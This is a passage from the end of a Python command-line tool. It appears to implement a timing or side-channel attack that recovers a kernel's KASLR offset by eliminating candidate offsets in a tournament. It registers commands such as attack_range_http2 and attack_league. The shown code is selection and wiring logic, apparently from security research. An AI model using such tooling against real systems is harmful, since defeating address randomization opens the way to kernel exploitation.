                run_again = False

            # Print current winner
            sorted_winner = sorted(winner)
            if verbose:
                click.echo(f"Current: {sorted_winner}")

            # random.shuffle(kaslr_offsets)
            subround += 1

        if len(winner) == 1:
            return winner[0]
        else:
            # Check if winner has enough members for pairs
            if len(winner) % 2 != 0:
                winner.append(loser[0])

            # Create new pairs out of winner
            kaslr_offsets = [x for x in winner]
            random.shuffle(kaslr_offsets)
            kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))
            if verbose:
                click.echo("New pairs")
                click.echo(kaslr_offset_pairs)
            t += 1


# Add commands
cli.add_command(attack_range)
cli.add_command(attack_range_http2)
cli.add_command(attack_range3)
cli.add_command(attack_chunks)
cli.add_command(attack_league)
cli.add_command(attack_league2)
cli.add_command(attack_league_http2)
cli.add_command(evaluate_raw)


if __name__ == "__main__":
    cli(obj=Dict())
